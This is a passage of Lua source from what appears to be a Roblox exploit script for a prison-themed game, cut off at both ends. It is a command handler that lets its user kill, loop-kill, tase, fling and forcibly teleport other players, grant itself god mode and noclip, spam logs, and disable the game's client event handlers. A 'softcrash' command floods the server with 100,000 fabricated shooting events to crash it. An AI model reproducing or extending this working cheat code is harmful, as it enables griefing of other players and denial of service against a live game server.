        print("====== INVISIBLE PLAYERS ======")
        for _,CHAR in pairs(workspace:GetChildren()) do
            if Players:FindFirstChild(CHAR.Name) then
                local Head = CHAR:FindFirstChild("Head")
                if Head then
                    if Head.Position.Y > 5000 or Head.Position.X > 99999 then
                        print(CHAR.Name .. " (" .. Players:FindFirstChild(CHAR.Name).DisplayName .. ")");
                    end
                end
            end
        end
        print("====== END ======")
        Notify("Success", "Type /console or F9 to see invisible players.", 2);
    end;
    if CMD("getf") or CMD("getflings") then
        print("====== INVISIBLE FLINGERS ======")
        local ValidParts = {}
        for _,CHAR in pairs(workspace:GetChildren()) do
            if Players:FindFirstChild(CHAR.Name) then
                for _,object in pairs(CHAR:GetChildren()) do
                    ValidParts[object.Name] = object;
                end
                if not ValidParts["Torso"] and not ValidParts["Head"] then
                    print(CHAR.Name .. " (" .. Players:FindFirstChild(CHAR.Name).DisplayName .. ")");
                end
                ValidParts = {}
            end
        end
        print("====== END ======")
        Notify("Success", "Type /console or F9 to see invisible flingers.", 2);
    end
    if CMD("geta") or CMD("getarmorspammers") then
        print("====== ARMOR SPAMMERS ======")
        for i,v in pairs(ArmorSpamFlags) do
            if v > 50 and Players:FindFirstChild(i) then
                print(i .. " (" .. Players:FindFirstChild(i).DisplayName .. ")");
            end;
        end;
        print("====== END ======")
        Notify("Success", "Type /console or F9 to see armor spammers.", 2);
    end;
    if CMD("getlk") or CMD("getloopkills") then
        print("====== LOOPKILLING ======")
        for i,v in pairs(Loopkilling) do
            print(v.Name .. " (" .. v.DisplayName .. ")");
        end;
        print("====== END ======")
        Notify("Success", "Type /console or F9 to see who are being loopkilled.", 2);
    end;
    if CMD("getp") or CMD("getprotected") then
        print("====== PROTECTED ======")
        for i,v in pairs(Protected) do
            print(v.Name .. " (" .. v.DisplayName .. ")");
        end;
        print("====== END ======")
        Notify("Success", "Type /console or F9 to see protected.", 2);
    end;
    if CMD("bfling") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            if not States.BodyFling then
                coroutine.wrap(BodyFling)(Player);
                Notify("Success", "Body flung " .. Player.Name .. ".", 2);
            else
                Notify("Error", "You are already body flinging someone.", 2);
            end
        else
            Notify("Error", Args[2] .. " isn't a valid player.", 2);
        end;
    end;
    if CMD("psettings") or CMD("ps") then
        local Setting, Value = Args[2], ToBoolean(Args[3]);
        if Setting and Value ~= nil then
            ProtectedSettings[Setting] = Value;
            Notify("Success", "Set " .. Args[2] .. " to: " .. Args[3] .. ". (Protected Settings)", 2);
        end;
        ChangeImmunityToggle(ProtectedSettings.killcmds, "Kill Commands");
        ChangeImmunityToggle(ProtectedSettings.tpcmds, "Teleport Commands");
        ChangeImmunityToggle(ProtectedSettings.arrestcmds, "Arrest Commands");
        ChangeImmunityToggle(ProtectedSettings.othercmds, "Other Commands");
    end;
    if CMD("unbfling") then
        States.BodyFling = false;
        Notify("Success", "Stopped body fling.", 2);
    end;
    if CMD("getadmins") then
        print("====== ADMINS ======")
        for i,v in next, Admins do
            print(v.Name .. " (" .. v.DisplayName .. ")");
        end;
        Notify("Success", "Type /console or F9 to see admins.", 2);
        print("====== END ======")
    end;
    if CMD("getwpnames") or CMD("getwaypointnames") then
        print("====== WAYPOINTS ======")
        for i,v in next, SavedWaypoints do
            print(i .. ":", v.X, v.Y, v.Z);
        end;
        Notify("Success", "Type /console or F9 to see waypoints.", 2);
        print("====== END ======")
    end
    if CMD("as") or CMD("asettings") then
        local Setting, Value = Args[2], ToBoolean(Args[3]);
        if Setting and Value ~= nil then
            AdminSettings[Setting] = Value;
            Notify("Success", "Set " .. Args[2] .. " to: " .. Args[3] .. ". (Admin Settings)", 2);
        end;
        ChangeAdminGuiToggle(AdminSettings.killcmds, "Kill Commands");
        ChangeAdminGuiToggle(AdminSettings.tpcmds, "Teleport Commands");
        ChangeAdminGuiToggle(AdminSettings.arrestcmds, "Arrest Commands");
        ChangeAdminGuiToggle(AdminSettings.othercmds, "Other Commands");
    end;
    if CMD("antipunch") or CMD("ap") then
        States.AntiPunch = not States.AntiPunch;
        ChangeGuiToggle(States.AntiPunch, "Anti-Punch");
        Notify("Success", "Toggled anti-punch to " .. tostring(States.AntiPunch) .. ".", 2);
    end;
    if CMD("exit") or CMD("fuckoff") then
        Notify("Success", "Unloading....", 2);
        States = {};
        UnloadScript();
        getgenv().WrathLoaded = false;
    end
    if CMD("ls") or CMD("logspam") then
        for i,v in next, Args do
            if i > 2 then
                Args[2] = Args[2] .. " " .. Args[i];
            end;
        end;
        local Message = Args[2];
        Notify("Success", "Now log spamming.", 2);
        coroutine.wrap(LogSpam)(Message);
    end;
    if CMD("unls") or CMD("unlogspam") then
        Notify("Success", "Stopped spamming.", 2);
        States.LogSpam = false;
    end;
    if CMD("prefix") then
        local Prefix = Args[2]
        if Prefix then
            Settings.Prefix = Prefix;
            Notify("Success", "Prefix was changed to: " .. Prefix, 2);
        end;
    end;
    if CMD("mkill") then
        SavePos();
        if Args[2] == "all" then
            for i,v in pairs(Players:GetPlayers()) do
                if v ~= LocalPlayer and CheckProtected(v, "killcmds") then
                    MeleeKill(v)
                end;
            end;
            Notify("Success", "Melee killed everyone.", 2);
        else
            local Player = GetPlayer(Args[2], LocalPlayer);
            if Player then
                MeleeKill(Player);
                Notify("Success", "Melee killed " .. Player.Name .. ".", 2);
            else
                Notify("Error", Args[2] .. " is not a valid player.", 2);
            end;
        end;
        LoadPos();
    end;
    if CMD("vkill") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            VoidKill(Player);
            Notify("Success", "Void killed " .. Player.Name .. ".", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("getps") or CMD("getprotectedsettings") then
        print("====== PROTECTED SETTINGS ======")
        for i,v in pairs(ProtectedSettings) do
            print(i, v);
        end;
        print("====== END ======");
        Notify("Success", "Type /console or F9 to see protected settings.", 2);
    end;
    if CMD("getas") or CMD("getadminsettings") then
        print("====== ADMIN SETTINGS ======");
        for i,v in pairs(AdminSettings) do
            print(i, v);
        end;
        print("====== END ======");
        Notify("Success", "Type /console or F9 to see admin settings.", 2);
    end;
    if CMD("getv") or CMD("getinfected") then
        print("====== INFECTED PLAYERS ======");
        for i,v in pairs(Infected) do
            print(v.Name .. " (" .. v.DisplayName .. ")");
        end;
        print("====== END ======");
        Notify("Success", "Type /console or F9 to see infected players.", 2);
    end;
    if CMD("getk") or CMD("getkillaura") then
        print("====== KILL AURAS ======")
        for i,v in pairs(KillAuras) do
            print(v.Name .. " (" .. v.DisplayName .. ")");
        end;
        print("====== END ======");
        Notify("Success", "Type /console or F9 to see kill auras.", 2);
    end;
    if CMD("clka") or CMD("clearkillaura") then
        KillAuras = {}
        Notify("Success", "Cleared kill auras", 2);
    end;
    if CMD("fpsboost") or CMD("antilag") or CMD("boost") then
        Notify("Loading...", "FPS boost", 2);
        FPSBoost();
    end;
    if CMD("tase") then
        if Args[2] == "all" then
            Tase(Players:GetPlayers());
        else
            local Player = GetPlayer(Args[2], LocalPlayer);
            if Player then
                Tase({Player});
                Notify("Success", "Tased " .. Player.Name .. ".", 2);
            else
                Notify("Error", Args[2] .. " is not a valid player.", 2);
            end;
        end
    end;
    if CMD("ta") or CMD("taseaura") then
        if Args[2] == "all" then
            for i,v in pairs(Players:GetPlayers()) do
                if v ~= LocalPlayer and CheckProtected(v, "killcmds") then
                    TaseAuras[v.UserId] = v;
                end;
            end;
            Notify("Success", "Gave everyone tase aura.", 2);
        else
            local Player = GetPlayer(Args[2], LocalPlayer);
            if Player then
                TaseAuras[Player.UserId] = Player;
                Notify("Success", "Gave " .. Player.Name .. " tase aura.", 2);
            else
                Notify("Error", Args[2] .. " is not a valid player.", 2);
            end;
        end;
    end;
    if CMD("unta") or CMD("untaseaura") then
        if Args[2] == "all" then
            TaseAuras = {}
            Notify("Success", "Removed everyone's tase aura.", 2);
        else
            local Player = GetPlayer(Args[2], LocalPlayer);
            if Player then
                TaseAuras[Player.UserId] = nil;
                Notify("Success", "Removed " .. Player.Name .. "'s tase aura.", 2);
            else
                Notify("Error", Args[2] .. " is not a valid player.", 2);
            end;
        end;
    end;
    if CMD("lt") then
        if Args[2] == "all" then
            States.TaseAll = true;
            Notify("Success", "Loop-tasing everyone.", 2);
        else
            local Player = GetPlayer(Args[2], LocalPlayer);
            if Player then
                LoopTasing[Player.UserId] = Player;
                Notify("Success", "Loop-tasing " .. Player.Name .. ".", 2);
            else
                Notify("Error", Args[2] .. " is not a valid player.", 2);
            end;
        end;
    end;
    if CMD("unlt") then
        if Args[2] == "all" then
            States.TaseAll = false
            LoopTasing = {};
            Notify("Success", "Stopped loop-tasing everyone.", 2);
        else
            local Player = GetPlayer(Args[2], LocalPlayer);
            if Player then
                LoopTasing[Player.UserId] = nil;
                Notify("Success", "Stopped Loop-tasing " .. Player.Name .. ".", 2);
            else
                Notify("Error", Args[2] .. " is not a valid player.", 2);
            end;
        end;
    end;
    if CMD("clt") or CMD("cleartase") then
        LoopTasing = {};
        Notify("Success", "Cleared loop tase.", 2);
    end;
    if CMD("ma") or CMD("meleeaura") then
        States.MeleeAura = not States.MeleeAura
        Notify("Success", "Toggled melee aura to " .. tostring(States.MeleeAura) .. ".", 2);
    end;
    if CMD("getlt") or CMD("getlooptase") then
        print("====== LOOP TASING ======")
        for i,v in pairs(LoopTasing) do
            print(v.Name .. " (" .. v.DisplayName .. ")");
        end;
        print("====== END ======");
        Notify("Success", "Type /console or F9 to see loop tasing.", 2);
    end;
    if CMD("getmlk") or CMD("getmeleeloopkill") then
        print("====== LOOP MELEE KILLING ======")
        for i,v in pairs(MeleeKilling) do
            print(v.Name .. " (" .. v.DisplayName .. ")");
        end;
        print("====== END ======");
        Notify("Success", "Type /console or F9 to see loop melee killing.", 2);
    end;
    if CMD("mlk") then
        if Args[2] == "all" then
            States.MeleeAll = true;
            Notify("Success", "Melee loop-killing all.", 2);
        else
            local Player = GetPlayer(Args[2], LocalPlayer);
            if Player then
                MeleeKilling[Player.UserId] = Player;
                Notify("Success", "Melee loop-killing " .. Player.Name .. ".")
            else
                Notify("Error", Args[2] .. " is not a valid player.", 2);
            end;
        end;
    end;
    if CMD("unmlk") then
        if Args[2] == "all" then
            States.MeleeAll = false;
            MeleeKilling = {};
            Notify("Success", "Stopped melee loop-killing all.", 2);
        else
            local Player = GetPlayer(Args[2], LocalPlayer);
            if Player then
                MeleeKilling[Player.UserId] = nil;
                Notify("Success", "Stopped melee loop-killing " .. Player.Name .. ".")
            else
                Notify("Error", Args[2] .. " is not a valid player.", 2);
            end;
        end;
    end;
    if CMD("slk") or CMD("speedloopkill") then
        if Args[2] == "all" then
            States.SpeedKillAll = true;
        elseif Args[2] == "guards" or Args[2] == "g" then
            States.SpeedKillGuards = true;
        elseif Args[2] == "inmates" or Args[2] == "i" then
            States.SpeedKillInmates = true;
        elseif Args[2] == "criminals" or Args[2] == "c" then
            States.SpeedKillCriminals = true;
        else
            local Player = GetPlayer(Args[2], LocalPlayer);
            if Player then
                SpeedKilling[Player.UserId] = Player;
                Notify("Success", "Speed loop-killing " .. Player.Name .. ".", 2)
            else
                Notify("Error", Args[2] .. " is not a valid player.", 2);
            end;
        end;
    end;
    if CMD("unslk") or CMD("unspeedloopkill") then
        if Args[2] == "all" then
            SpeedKilling = {};
            States.SpeedKillAll = false;
        elseif Args[2] == "guards" or Args[2] == "g" then
            States.SpeedKillGuards = false;
        elseif Args[2] == "inmates" or Args[2] == "i" then
            States.SpeedKillInmates = false;
        elseif Args[2] == "criminals" or Args[2] == "c" then
            States.SpeedKillCriminals = false;
        else
            local Player = GetPlayer(Args[2], LocalPlayer);
            if Player then
                SpeedKilling[Player.UserId] = nil;
                Notify("Success", "Stopped speed loop-killing " .. Player.Name .. ".", 2)
            else
                Notify("Error", Args[2] .. " is not a valid player.", 2);
            end;
        end;
    end;
    if CMD("god") then
        SavePos();
        States.GodMode = true;
        Notify("Success", "Turned on god mode.", 2);
    end;
    if CMD("ungod") then
        States.GodMode = false;
        Notify("Success", "Turned off god mode.", 2);
    end;
    if CMD("clogs") or CMD("combatlogs") then
        if not States.AntiCrash then
            States.CombatLogs = not States.CombatLogs;
            Notify("Success", "Toggled combat logs to " .. tostring(States.CombatLogs) .. ".", 2);
        else
            Notify("Error", "Disable anticrash first! (" .. Settings.Prefix .. "acrash / " .. Settings.Prefix .. "anticrash).", 2);
        end;
    end;
    if CMD("shootback") or CMD("sb") then
        if not States.AntiCrash then
            local Player = GetPlayer(Args[2], LocalPlayer);
            if Player then
                if Player == LocalPlayer then
                    States.ShootBack = not States.ShootBack;
                    ChangeGuiToggle(States.ShootBack, "Shoot Back");
                    Notify("Success", "Toggled shoot back to " .. tostring(States.ShootBack) .. ".", 2);
                else
                    if not AntiShoots[Player.UserId] then
                        AntiShoots[Player.UserId] = Player;
                        Notify("Success", "Gave shoot back to " .. Player.Name .. ". Type " .. Settings.Prefix .. "sb [plr] to disable.", 2);
                    else
                        AntiShoots[Player.UserId] = nil;
                        Notify("Success", "Removed shoot back from " .. Player.Name .. ".", 2);
                    end;
                end;
            else
                Notify("Error", Args[2] .. " is not a valid player.", 2);
            end;
        else
            Notify("Error", "Disable anticrash first! (" .. Settings.Prefix .. "acrash / " .. Settings.Prefix .. "anticrash).", 2);
        end;
    end;
    if CMD("tb") or CMD("taseback") then
        if not States.AntiCrash then
            local Player = GetPlayer(Args[2], LocalPlayer);
            if Player then
                if Player == LocalPlayer then
                    States.TaseBack = not States.TaseBack;
                    ChangeGuiToggle(States.TaseBack, "Tase Back");
                    Notify("Success", "Toggled tase back to " .. tostring(States.TaseBack) .. ". Type " .. Settings.Prefix .. "tb [plr] to disable.", 2);
                else
                    if not TaseBacks[Player.UserId] then
                        TaseBacks[Player.UserId] = Player;
                        Notify("Success", "Gave tase back to " .. Player.Name .. ".", 2);
                    else
                        TaseBacks[Player.UserId] = nil;
                        Notify("Success", "Removed tase back from " .. Player.Name .. ".", 2);
                    end;
                end;
            else
                Notify("Error", Args[2] .. " is not a valid player.", 2);
            end;
        else
            Notify("Error", "Disable anticrash first! (" .. Settings.Prefix .. "acrash / " .. Settings.Prefix .. "anticrash).", 2);
        end;
    end;
    if CMD("clsb") or CMD("clearshootback") then
        AntiShoots = {};
        Notify("Success", "Cleared shoot backs.", 2);
    end;
    if CMD("cltb") or CMD("cleartaseback") then
        TaseBacks = {};
        Notify("Success", "Cleared tase backs.", 2);
    end;
    if CMD("clop") then
        Onepunch = {};
        Notify("Success", "Cleared one punch.", 2);
    end;
    if CMD("clos") or CMD("clearoneshot") then
        Oneshots = {};
        Notify("Success", "Cleared one shot.", 2);
    end;
    if CMD("getstates") or CMD("gets") then
        print("====== STATES ======")
        for i,v in next, States do
            print(i, v)
        end;
        print("====== END ======")
        Notify("Success", "Type /console or press F9 to see states.", 2);
    end;
    if CMD("ffire") or CMD("friendlyfire") then
        States.FriendlyFire = not States.FriendlyFire;
        Info.FriendlyFireOldTeam = LocalPlayer.TeamColor.Name
        Notify("Success", "Toggled friendly fire to " .. tostring(States.FriendlyFire) .. ".", 2);
    end;
    if CMD("acrash") or CMD("anticrash") then
        States.AntiCrash = not States.AntiCrash;
        ChangeGuiToggle(States.AntiCrash, "Anti-Crash");
        Notify("Success", "Toggled anti crash to " .. tostring(States.AntiCrash) .. ".", 2);
        if States.AntiCrash then
            States.ShootBack = false
            States.TaseBack = false;
            ChangeGuiToggle(false, "Shoot Back");
            ChangeGuiToggle(false, "Tase Back");
            for i,v in pairs(getconnections(rStorage.ReplicateEvent.OnClientEvent)) do
                v:Disable();
            end;
        else
            for i,v in pairs(getconnections(rStorage.ReplicateEvent.OnClientEvent)) do
                v:Enable();
            end;
        end;
    end;
    if CMD("getd") or CMD("getdef") then
        print("====== DEFENSES ======")
        print("AntiShoot", States.ShootBack);
        print("AntiBring", States.AntiBring);
        print("AntiFling", States.AntiFling);
        print("AntiPunch", States.AntiPunch);
        print("AntiCrash", States.AntiCrash);
        print("AntiCriminal", States.AntiCriminal);
        print("====== END ======")
    end;
    if CMD("nuke") or CMD("kamikaze") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Nukes[Player.UserId] = Player;
            Chat("!!! " .. Player.DisplayName .. " has turned into a nuke - if they die everyone dies !!!");
            Notify("Success", "Turned " .. Player.Name .. " into a nuke.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("defuse") or CMD("unnuke") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Nukes[Player.UserId] = nil;
            Notify("Success", "Removed nuke from " .. Player.Name .. ".", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("btools") then
        local tool1 = Instance.new("HopperBin", LocalPlayer.Backpack)
        local tool2 = Instance.new("HopperBin", LocalPlayer.Backpack)
        local tool3 = Instance.new("HopperBin", LocalPlayer.Backpack)
        local tool4 = Instance.new("HopperBin", LocalPlayer.Backpack)
        local tool5 = Instance.new("HopperBin", LocalPlayer.Backpack)
        tool1.BinType = "Clone"
        tool2.BinType = "GameTool"
        tool3.BinType = "Hammer"
        tool4.BinType = "Script"
        tool5.BinType = "Grab"
        Notify("Success", "Obtained btools", 2);
    end;
    if CMD("gui") or CMD("guis") then
        ToggleGuis();
    end;
    if CMD("bindgui") or CMD("guikeybind") then
        local Bind = Args[2]
        if Bind then
            if CheckKeycode(Bind) then
                Settings.ToggleGui = Bind;
                Notify("Success", "Changed GUI bind to " .. Bind .. ".", 2);
            else
                Notify("Error", "That is not a valid keybind. If it is a letter make sure its capitalised.")
            end;
        else
            Notify("Error", "Specify a keybind.", 2);
        end;
    end;
    if CMD("noclip") then
        States.NoClip = true;
        Notify("Success", "Enabled no-clip. Use " .. Settings.Prefix .. "clip to disable.", 2);
    end;
    if CMD("clip") then
        States.NoClip = false;
        Notify("Success", "Disabled no-clip.", 2);
    end;
    if CMD("ff") or CMD("forcefield") then
        States.Forcefield = true;
        SavePos();
        Notify("Success", "Enabled force field", 2);
    end;
    if CMD("unff") or CMD("unforcefield") then
        States.Forcefield = false;
        Notify("Success", "Disabled force field", 2);
    end;
    if CMD("pa") or CMD("punchaura") then
        States.PunchAura = not States.PunchAura;
        Notify("Success", "Toggled punch aura to " .. tostring(States.PunchAura) .. ".", 2);
    end;
    if CMD("sp") or CMD("spampunch") then
        States.SpamPunch = not States.SpamPunch
        Notify("Success", "Toggled spam punch to " .. tostring(States.SpamPunch) .. ".", 2);
    end;
    if CMD("op") or CMD("onepunch") then
        local Player = GetPlayer(Args[2], LocalPlayer);

        if Player then
            if Player == LocalPlayer then
                States.OnePunch = not States.OnePunch
                Notify("Success", "Toggled one punch to " .. tostring(States.OnePunch) .. ".", 2);
            else
                if not Onepunch[Player.UserId] then
                    Onepunch[Player.UserId] = Player
                    Notify("Success", "Added one punch to " .. Player.Name .. ". Type " .. Settings.Prefix .. "op [plr] to disable.", 2);
                else
                    Onepunch[Player.UserId] = nil;
                    Notify("Success", "Removed one punch from " .. Player.Name .. ".", 2);
                end;
            end;
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("os") or CMD("oneshot") then
        local Player = GetPlayer(Args[2], LocalPlayer);

        if Player then
            if Player == LocalPlayer then
                States.OneShot = not States.OneShot;
                Notify("Success", "Toggled one shot to " .. tostring(States.OneShot) .. ".", 2);
            else
                if not States.AntiCrash then
                    if not Oneshots[Player.UserId] then
                        Oneshots[Player.UserId] = Player
                        Notify("Success", "Added one shot to " .. Player.Name .. ". Type " .. Settings.Prefix .. "os [plr] to disable.", 2);
                    else
                        Oneshots[Player.UserId] = nil;
                        Notify("Success", "Removed one shot from " .. Player.Name .. ".", 2);
                    end;
                else
                    Notify("Error", "Disable anticrash first! (" .. Settings.Prefix .. "acrash / " .. Settings.Prefix .. "anticrash).", 2);
                end;
            end;
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("ctp") or CMD("clicktp") then
        local Player = GetPlayer(Args[2], LocalPlayer);

        if Player then
            if Player == LocalPlayer then
                States.ClickTeleport = not States.ClickTeleport;
                Notify("Success", "Toggled click tp to " .. tostring(States.ClickTeleport) .. ". (CTRL)", 2);
            else
                if not States.AntiCrash then
                    if not ClickTeleports[Player.UserId] then
                        ClickTeleports[Player.UserId] = Player
                        Notify("Success", "Added click tp to " .. Player.Name .. ". Type " .. Settings.Prefix .. "ctp [plr] to disable.", 2);
                    else
                        ClickTeleports[Player.UserId] = nil;
                        Notify("Success", "Removed click tp from " .. Player.Name .. ".", 2);
                    end;
                else
                    Notify("Error", "Disable anticrash first! (" .. Settings.Prefix .. "acrash / " .. Settings.Prefix .. "anticrash).", 2);
                end;
            end;
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("clctp") then
        ClickTeleports = {};
        Notify("Success", "Cleared click teleports.", 2);
    end;
    if CMD("hop") then
        local FoundServers = {};
        for i,v in pairs(HttpService:JSONDecode(game:HttpGetAsync("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100")).data) do
            if type(v) == "table" and v.playing < v.maxPlayers and v.id ~= game.JobId then
                FoundServers[#FoundServers+1] = v.id;
            end;
        end;

        if #FoundServers > 0 then
            Notify("Success", "Server hopping...", 2);
            TeleportService:TeleportToPlaceInstance(game.PlaceId, FoundServers[math.random(1, #FoundServers)]);
        else
            Notify("Error", "Couldn't find a server to join.", 2);
        end;
    end;
    if CMD("copyteam") or CMD("ct") then
        if not States.CopyingTeam then
            local Player = GetPlayer(Args[2], LocalPlayer);
            if Player and Player ~= LocalPlayer then
                States.CopyingTeam = {Player = Player};
                States.CopyingTeam.Connection = Player:GetPropertyChangedSignal("TeamColor"):Connect(function()
                    if not next(Loopkilling) or not next(SpeedKilling) or not next(LoopTasing) then
                        local NewTeam = Player.TeamColor.Name
                        SavePos();
                        if NewTeam == "Bright orange" or NewTeam == "Medium stone grey" then
                            TeamEvent(NewTeam);
                        else
                            if NewTeam == "Bright blue" then
                                if #Teams.Guards:GetPlayers() >= 8 then
                                    Loadchar(NewTeam)
                                else
                                    TeamEvent(NewTeam);
                                end;
                            else
                                Loadchar(NewTeam);
                            end;
                        end;
                        LoadPos();
                    end;
                end);
                if Player.TeamColor ~= LocalPlayer.TeamColor then
                    SavePos();
                    Loadchar(Player.TeamColor.Name);
                    LoadPos();
                end;
                Notify("Success", "Copying team of " .. Player.Name .. ". Type " .. Settings.Prefix .. "ct [plr] to disable.", 2);
            else
                Notify("Error", Args[2] .. " is not a valid player.", 2);
            end;
        else
            Notify("Success", "Disabled copy team.", 2);
            States.CopyingTeam.Connection:Disconnect();
            States.CopyingTeam = nil;
        end;
    end;
    if CMD("gs") or CMD("gunspin") then
        task.spawn(function()
            States.SpinningGuns = true;
            local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:wait()
            if Character then
                GiveGuns();
                local speed = 10
                local radius = 10
                local finish;

                if Args[2] and tonumber(Args[2]) then
                    radius = tonumber(Args[2])
                end
                if Args[3] and tonumber(Args[3]) then
                    speed = tonumber(Args[3])
                end
                local spinguns = {
                    ["AK-47"] = CFrame.new(-radius, 0, 0);
                    ["Remington 870"] = CFrame.new(radius, 0, 0);
                }

                for i,v in pairs(LocalPlayer.Backpack:GetChildren()) do
                    if spinguns[v.Name] then
                        v.Grip = spinguns[v.Name]
                        v.Parent = Character
                    end
                end

                task.spawn(function()
                    LocalPlayer.CharacterAdded:wait()
                    finish = true
                end);
                
                task.wait(0.1);
                
                repeat
                    for i,v in pairs(Character:GetChildren()) do
                        if spinguns[v.Name] then
                            v.Grip = v.Grip * CFrame.Angles(0,math.rad(speed), 0);
                            v.Parent = LocalPlayer.Backpack;
                            v.Parent = Character;
                        end;
                    end;
                    game:GetService("RunService").RenderStepped:wait();
                until finish == true;
            end;
        end);
        Notify("Success", "Spinning guns (respawn / reset to disable)", 2);
    end;
    if CMD("sc") or CMD("softcrash") then
        local Events = {};
        for i = 1, 100000 do
            local origin, destination = LocalPlayer.Character.HumanoidRootPart.Position, workspace:FindFirstChildOfClass("Part").Position;
            local distance, ray = (origin-destination).Magnitude, Ray.new(origin, (destination-origin).unit*9e9)
            local cf = CFrame.new(destination, origin) * CFrame.new(0, 0, -distance / 2);
            Events[#Events+1] = {
                Hit = v,
                Cframe = cf,
                Distance = distance,
                RayObject = Ray.new(Vector3.new(), Vector3.new())
            }
        end;
        ItemHandler(workspace.Prison_ITEMS.giver["AK-47"].ITEMPICKUP);
        local Gun = LocalPlayer.Character:FindFirstChild("AK-47") or LocalPlayer.Backpack:FindFirstChild("AK-47")
        rStorage.ShootEvent:FireServer(Events, Gun)
        rStorage.ReloadEvent:FireServer(Gun);
        Notify("Success", "Soft-crashed server.", 2);
    end;
    if CMD("lb") or CMD("loopbring") then
        if Args[2] == "all" then
            Notify("Success", "Loop-bringing all.", 2);
            pcall(LoopTeleport, LocalPlayer, LocalPlayer.Character.Head.CFrame, true);
        else
            local Player = GetPlayer(Args[2], LocalPlayer);
            if Player then
                Notify("Success", "Loop-bringing " .. Player.Name .. ".", 2);
                pcall(function()
                    LoopTeleport(Player, LocalPlayer.Character.Head.CFrame);
                end);
            else
                Notify("Error", Args[2] .. " is not a valid player.", 2);
            end;
        end;
    end;
    if CMD("unlb") then
        States.Loopbring = false;
        Notify("Success", "Stopped loop bringing.", 2);
    end;
    if CMD("cltr") then
        Trapped = {};
        Notify("Success", "Untrapped all", 2);
    end;
    if CMD("lpunch") or CMD("loudpunch") then
        States.LoudPunch = not States.LoudPunch
        Notify("Success", "Toggled loud punch to " .. tostring(States.LoudPunch) .. ".", 2);
    end;
    if CMD("sarmor") or CMD("spamarmor") then
        if CheckOwnedGamepass() then
            States.SpamArmor = true
            local Amount = Args[2] or 10
            local Num = tonumber(Args[2])
            if Num then
                Notify("Success", "Armor spamming.", 2);
                SavePos()
                Loadchar("Bright blue")
                LoadPos()
                task.spawn(ArmorSpam, Num)
            end;
        else
            Notify("Error", "You don't have the riot gamepass", 2);
        end;
    end;
    if CMD("unsarmor") or CMD("unspamarmor") then
        States.ArmorSpam = false;
        Notify("Success", "Stopped armor spamming.", 2);
    end;
	if CMD("kcf") then
		States.Kcf = true
		Notify("Success", "Kcf turned on.", 2);
	end 
	if CMD("unkcf") then
		States.Kcf = false
		Notify("Success", "Kcf turned off.", 2);
	end
	if CMD("shock") or CMD("fence") then
	    local Player = GetPlayer(Args[2], LocalPlayer)
        if Player then
            Teleport(Player, CFrame.new(698.88549804688, 118.66983032227, 2567.1765136719));
            Notify("Success", "shocked " .. Player.Name .. 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
	end
	if CMD("fridge") then
	    local Player = GetPlayer(Args[2], LocalPlayer)
        if Player then
            Teleport(Player, CFrame.new(787.4412841796875, 102.35999298095703, 2251.14453125));
            Notify("Success", "Teleported " .. Player.Name ..("to the fridge."), 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
	end
	if CMD("border") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(778.280029, 396.23996, 2674.35278, 0.998099327, 4.16638704e-06, -0.0616256408, 3.69708708e-08, 1, 6.82067985e-05, 0.0616256408, -6.80794183e-05, 0.998099327));
            Notify("Success", "Teleported " .. Player.Name .. " to Border.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("cbr") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(-920.1688842773438, 127.95339965820312, 2056.17919921875));
            Notify("Success", "Teleported " .. Player.Name .. " to criminal base roof.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("hr2") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(-297.250732421875, 84.00051879882812, 2526.088134765625));
            Notify("Success", "Teleported " .. Player.Name .. " to houses roof 2.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("hr") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(-295.0574951171875, 85.0084457397461, 2439.64892578125));
            Notify("Success", "Teleported " .. Player.Name .. " to houses roof.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("houses") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(-202.79991149902344, 54.17512893676758, 2481.110107421875));
            Notify("Success", "Teleported " .. Player.Name .. " to Houses.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("shr") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(-97.59503173828125, 79.7487564086914, 2412.50927734375));
            Notify("Success", "Teleported " .. Player.Name .. " to small house roof.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("smallhouse") or CMD("sh") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(-96.72844696044922, 56.09928894042969, 2409.82763671875));
            Notify("Success", "Teleported " .. Player.Name .. " to small house.", 2);
        else
            Notify("Error", Args[2] .. " is not a valid player.", 2);
        end;
    end;
    if CMD("apr") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player then
            Teleport(Player, CFrame.new(-304.2353515625, 54.17502212524414, 2135.096923828125));
            Notify("Success", "Teleported " .. Player.Name .. " to apartments.", 2);
        else
